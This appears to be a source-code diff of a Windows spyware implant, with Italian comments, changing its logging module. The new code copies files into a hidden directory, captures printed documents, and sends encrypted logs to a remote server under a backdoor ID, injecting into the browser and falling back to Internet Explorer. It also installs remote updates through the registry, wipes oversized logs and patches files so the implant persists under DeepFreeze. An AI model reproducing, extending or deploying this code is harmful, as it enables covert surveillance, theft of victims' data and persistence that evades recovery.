@@ -10,6 +10,9 @@
 #include "md5.h"
 #include "explore_directory.h"
 #include "x64.h"
+#include "JSON\JSON.h"
+#include "UnHookClass.h"
+#include "DeepFreeze.h"
 
 typedef struct {
 	DWORD agent_tag;
@@ -50,7 +53,9 @@ log_entry_struct log_table[MAX_LOG_ENTRIES];
 extern BOOL IsGreaterDate(nanosec_time *, nanosec_time *);
 
 // In BitmapCommon
-extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData);
+extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality);
+typedef void (WINAPI *conf_callback_t)(JSONObject, DWORD counter);
+extern BOOL HM_ParseConfGlobals(char *conf, conf_callback_t call_back);
 
 extern aes_context crypt_ctx; // Dichiarata in shared
 extern aes_context crypt_ctx_conf; // Dichiarata in shared
@@ -64,6 +69,23 @@ DWORD max_disk_full = 0;    // Spazio massimo occupabile dai log
 extern DWORD log_free_space; // Dichiarata nel segmento shared
 extern DWORD log_active_queue;
 
+extern BOOL IsDeepFreeze();
+
+#define LOG_SIZE_MAX ((DWORD)1024*1024*100) //100MB
+DWORD GetLogSize(char *path)
+{
+	DWORD hi_dim=0, lo_dim=0;
+	HANDLE hfile;
+
+	hfile = FNC(CreateFileA)(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+	if (hfile == INVALID_HANDLE_VALUE) 
+		return 0xFFFFFFFF;
+	lo_dim = FNC(GetFileSize)(hfile, &hi_dim);
+	CloseHandle(hfile);
+	if (lo_dim == INVALID_FILE_SIZE || hi_dim>0)
+		return 0xFFFFFFFF;
+	return lo_dim;
+}
 
 // Inserisce un elemento nella lista dei log da spedire in ordine di tempo
 BOOL InsertLogList(log_list_struct **log_list, WIN32_FIND_DATA *log_elem)
@@ -144,32 +166,29 @@ void LOG_InitCryptKey(BYTE *crypt_material, BYTE *crypt_material_conf)
 	aes_set_key( &crypt_ctx_conf, crypt_material_conf, KEY_LEN*8 );
 }
 
+void WINAPI ParseGlobalsQuota(JSONObject conf_json, DWORD dummy)
+{
+	JSONObject quota;
+	
+	if (!conf_json[L"quota"]->IsObject())
+		return;
+
+	quota = conf_json[L"quota"]->AsObject();
+	min_disk_free = (DWORD) quota[L"min"]->AsNumber();
+	max_disk_full = (DWORD) quota[L"max"]->AsNumber();
+	log_wipe_file = (BOOL) conf_json[L"wipe"]->AsBool();
+}
+
 // Legge la configuazione per i log
 // (viene letto solo quando inizializza i log e
 // non sulla ricezione di un nuovo file)
 void UpdateLogConf()
 {
-	BYTE *conf_memory;
-
+	char *conf_memory;
 	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
-
-	// Effettua il parsing del file di configurazione mappato
-	// XXX Non c'e' il controllo che conf_ptr possa uscire fuori dalle dimensioni del file mappato
-	// (viene assunto che la configurazione sia coerente e il file integro)
-	if (conf_memory) {
-		BYTE *conf_ptr;
-
-		// conf_ptr si sposta nel file durante la lettura
-		conf_ptr = (BYTE *)HM_memstr((char *)conf_memory, LOGRP_CONF_DELIMITER);
-		// Legge lo spazio disco minimo
-		READ_DWORD(min_disk_free, conf_ptr);
-		// Legge lo spazio massimo occupabile
-		READ_DWORD(max_disk_full, conf_ptr);
-		// Legge se fare il wiping
-		READ_DWORD(log_wipe_file, conf_ptr);
-
-		SAFE_FREE(conf_memory);
-	}
+	if (conf_memory)
+		HM_ParseConfGlobals(conf_memory, &ParseGlobalsQuota);
+	SAFE_FREE(conf_memory);	
 }
 
 
@@ -240,10 +259,20 @@ DWORD LOG_GetActualLogSize()
 	return log_total_size;
 }
 
+void LOG_InitSequentialLogs()
+{
+	DWORD i;
+
+	// Inizializza la tabella dei log
+	for (i=0; i<MAX_LOG_ENTRIES; i++) {
+		log_table[i].agent_tag = NO_TAG_ENTRY;
+		log_table[i].h_file = INVALID_HANDLE_VALUE;
+	}
+}
+
 // Inizializza l'utilizzo dei log
 void LOG_InitLog()
 {
-	DWORD i;
 	ULARGE_INTEGER temp_free_space;
 	char disk_path[DLLNAMELEN];
 	DWORD temp_log_space;
@@ -255,11 +284,7 @@ void LOG_InitLog()
 	// Legge la configurazione dei log
 	UpdateLogConf();
 
-	// Inizializza la tabella dei log
-	for (i=0; i<MAX_LOG_ENTRIES; i++) {
-		log_table[i].agent_tag = NO_TAG_ENTRY;
-		log_table[i].h_file = INVALID_HANDLE_VALUE;
-	}
+	LOG_InitSequentialLogs();
 
 	// Inizializza lo spazio rimanente sul disco
 	// dove e' la directory di lavoro
@@ -805,10 +830,81 @@ BOOL Log_CryptCopyFile(WCHAR *src_path, char *dest_file_path, WCHAR *display_nam
 	return TRUE;
 }
 
+// Crea un file di log di tipo "file capture" vuoto, nel caso non sia stato possibile catturarlo per size 
+// Specifica la size nel nome del file stesso
+BOOL Log_CryptCopyEmptyFile(WCHAR *src_path, char *dest_file_path, WCHAR *display_name, DWORD existent_file_len, DWORD agent_tag)
+{
+	HANDLE hdst;
+	DWORD dwRead;
+	BY_HANDLE_FILE_INFORMATION dst_info;
+	DWORD existent_file_size = 0;
+	BYTE *file_additional_data;
+	BYTE *log_file_header;
+	FileAdditionalData *file_additiona_data_header;
+	DWORD header_len;
+	WCHAR to_display[MAX_PATH];
+
+	if (display_name) 
+		_snwprintf_s(to_display, sizeof(to_display)/sizeof(WCHAR), _TRUNCATE, L"%s [%dB]", display_name, existent_file_len);		
+	else
+		_snwprintf_s(to_display, sizeof(to_display)/sizeof(WCHAR), _TRUNCATE, L"%s [%dB]", src_path, existent_file_len);		
+
+	// Crea l'header da scrivere nel file
+	if ( !(file_additional_data = (BYTE *)malloc(sizeof(FileAdditionalData) + wcslen(to_display) * sizeof(WCHAR))))
+		return FALSE;
+	file_additiona_data_header = (FileAdditionalData *)file_additional_data;
+	file_additiona_data_header->uVersion = LOG_FILE_VERSION;
+	file_additiona_data_header->uFileNameLen = wcslen(to_display) * sizeof(WCHAR);
+	memcpy(file_additiona_data_header+1, to_display, file_additiona_data_header->uFileNameLen);
+	log_file_header = Log_CreateHeader(agent_tag, file_additional_data, file_additiona_data_header->uFileNameLen + sizeof(FileAdditionalData), &header_len);
+	SAFE_FREE(file_additional_data);
+	if (!log_file_header)
+		return FALSE;
+	
+	// Prende le info del file destinazione (se esiste)
+	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
+	if (hdst != INVALID_HANDLE_VALUE) {
+		if (FNC(GetFileInformationByHandle)(hdst, &dst_info)) {
+			existent_file_size = dst_info.nFileSizeLow;
+		}
+		CloseHandle(hdst);
+	}
+
+	// Controlla che ci sia ancora spazio per scrivere su disco
+	if ((log_free_space + existent_file_size)<= MIN_CREATION_SPACE) {
+		SAFE_FREE(log_file_header);
+		return FALSE;
+	}
+
+	hdst = FNC(CreateFileA)(dest_file_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, 0, NULL);
+	if (hdst == INVALID_HANDLE_VALUE) {
+		SAFE_FREE(log_file_header);
+		return FALSE;
+	}
+	// Se il file e' stato sovrascritto (e con successo) restituisce la quota disco
+	// recuperata.
+	log_free_space += existent_file_size;
+
+	// Scrive l'header nel file
+	if (!FNC(WriteFile)(hdst, log_file_header, header_len, &dwRead, NULL)) {
+		CloseHandle(hdst);
+		SAFE_FREE(log_file_header);
+		return FALSE;
+	}
+	if (log_free_space >= header_len)
+		log_free_space -= header_len;
+
+	SAFE_FREE(log_file_header);
+	FNC(FlushFileBuffers)(hdst);
+	CloseHandle(hdst);
+	return TRUE;
+}
+
+
 // Copia il file nella directory nascosta. Fa un hash del path.
 // File con path uguale vengono sovrascritti. Effettua la copia solo
 // se la destinazione non ha la stessa data della sorgente.
-BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, DWORD agent_tag)
+BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, BOOL empty_copy, DWORD agent_tag)
 {
 	HANDLE hfile;
 	BY_HANDLE_FILE_INFORMATION src_info, dst_info;
@@ -891,6 +987,13 @@ BOOL Log_CopyFile(WCHAR *src_path, WCHAR *display_name, DWORD agent_tag)
 		dst_date.lo_delay = dst_info.ftLastWriteTime.dwLowDateTime;
 		if (!IsGreaterDate(&src_date, &dst_date)) 
 			return FALSE;
+	}
+	
+	// Se non doveva essere copiato tutto per via della size...
+	if (empty_copy) {
+		if (!Log_CryptCopyEmptyFile(src_path, dest_file_path, display_name, src_info.nFileSizeLow, agent_tag)) 
+			return FALSE;
+		return TRUE;
 	}
 
 	// Effettua la vera copia.
@@ -1067,7 +1170,7 @@ void __stdcall Log_PrintDC(WCHAR *doc_name, HDC print_dc, HBITMAP print_bmp, DWO
 			memcpy(log_header, doc_name, print_additional_header->uDocumentNameLen);
 
 			//Output su file
-			BmpToJpgLog(PM_PRINTAGENT, (BYTE *)print_additional_header, additional_len, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage);
+			BmpToJpgLog(PM_PRINTAGENT, (BYTE *)print_additional_header, additional_len, &bmiHeader, sizeof(BITMAPINFOHEADER), (BYTE *)pdwFullBits, bmiHeader.biSizeImage, 50);
 			SAFE_FREE(print_additional_header);
 		}
 	}
@@ -1133,6 +1236,12 @@ BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 
 		// Invia il log 
 		if (!ASP_SendLog(log_file_path, band_limit)) {
+			if (GetLogSize(log_file_path) > LOG_SIZE_MAX) {
+				HM_WipeFileA(log_file_path);
+				tmp_free_space = log_free_space + log_list->size;
+				if (tmp_free_space > log_free_space) 
+					log_free_space = tmp_free_space;
+			}
 			FreeLogList(&log_list_head);
 			ASP_Bye(); // Se fallisce con PROTO_NO chiude correttamente la sessione
 			return FALSE;
@@ -1195,9 +1304,8 @@ BOOL LOG_HandleUpload(BOOL is_upload)
 		if (!ASP_GetUpload(is_upload, file_name, sizeof(file_name), &upload_left))
 			return FALSE;
 
-		// XXX Questa riga la inseriro' quando gli upgrade non verranno piu' inviati negli upload
-		//if (is_upload)
-		//	continue;
+		if (is_upload)
+			continue;
 		// Se si tratta di upgrade cerca di capire cosa sono....
 
 		_snprintf_s(c_file_name, sizeof(c_file_name), "%S", file_name);
@@ -1206,10 +1314,14 @@ BOOL LOG_HandleUpload(BOOL is_upload)
 			DeleteFile(HM_CompletePath(c_file_name, s_file_path));
 
 		} else if(!strcmp(c_file_name, COMMON_UPDATE_NAME)) { 
-			if (CopyFile(HM_CompletePath(COMMON_UPDATE_NAME, s_file_path), HM_CompletePath(H4_UPDATE_FILE, d_file_path), FALSE))
+			if (CopyFile(HM_CompletePath(COMMON_UPDATE_NAME, s_file_path), HM_CompletePath(H4_UPDATE_FILE, d_file_path), FALSE)) {
 				HM_InsertRegistryKey(H4_UPDATE_FILE, TRUE);
+				if (IsDeepFreeze()) {
+					HideDevice dev_df;
+					DFFixCore(&dev_df, (unsigned char *)H4_UPDATE_FILE, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME, TRUE);
+				}
+			}
 			DeleteFile(HM_CompletePath(c_file_name, s_file_path));
-
 		} else if(!strcmp(c_file_name, COMMON_UPDATE64_NAME)) {
 			Kill64Core();
 			Sleep(1000); // Aspetta in caso la dll64 sia in qualche thread di hooking
@@ -1236,10 +1348,20 @@ BOOL LOG_HandleUpload(BOOL is_upload)
 		} else if(!strcmp(c_file_name, COMMON_EXE_INSTALLER_NAME)) {
 			CopyFile(HM_CompletePath(COMMON_EXE_INSTALLER_NAME, s_file_path), HM_CompletePath(EXE_INSTALLER_NAME, d_file_path), FALSE);
 			DeleteFile(HM_CompletePath(c_file_name, s_file_path));
+		} else {
+			HM_CompletePath(c_file_name, d_file_path);
 		}
 
-		// XXX Quando qui gestira' solo gli upgrade, cancellera' tutti i file che non conosce
-		// DeleteFile(HM_CompletePath(c_file_name, s_file_path));
+		DeleteFile(HM_CompletePath(c_file_name, s_file_path));
+
+		// Se c'e' DeepFreeze fixa i file 
+		if (IsDeepFreeze()) {
+			HideDevice dev_df;
+			WCHAR dest_path[MAX_PATH];
+			swprintf(dest_path, L"%S", d_file_path);
+			DFFixFile(&dev_df, dest_path);
+		}
+
 	} while(upload_left > 0);
 
 	return TRUE;
@@ -1332,7 +1454,7 @@ BOOL LOG_ReceiveNewConf()
 	// e cancella la copia di backup. altrimenti cancella 
 	// la copia non integra e basta. Torna TRUE se 
 	// ha copiato con successo.
-	if (!HM_CheckNewConf())
+	if (!HM_CheckNewConf(H4_CONF_BU))
 		return FALSE;
 
 	return TRUE; 
@@ -1357,14 +1479,22 @@ BOOL LOG_StartLogConnection(char *asp_server, char *backdoor_id, BOOL *uninstall
 	HM_GetDefaultBrowser(asp_process);
 
 	// Inizializza ASP
-	if (!ASP_Start(asp_process, asp_server))
-		return FALSE;
+	if (!ASP_Start(asp_process, asp_server)) {
+		// Se per qualche motivo non riesce a iniettarsi nel default browser, prova con IE32
+		HM_GetIE32Browser(asp_process);
+		if (!ASP_Start(asp_process, asp_server))
+			return FALSE;
+	}
 
 	// Seleziona il subtype
-	if (IsX64System()) 
+	/*if (IsX64System()) 
 		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WIN64");		
 	else
-		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WIN32");
+		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WIN32");*/
+	if (is_demo_version) 
+		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WINDOWS-DEMO");		
+	else
+		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WINDOWS");
 
 	// Seleziona l'instance_id univoco
 	if (!GetUserUniqueHash((BYTE *)instance_id, sizeof(instance_id))) {
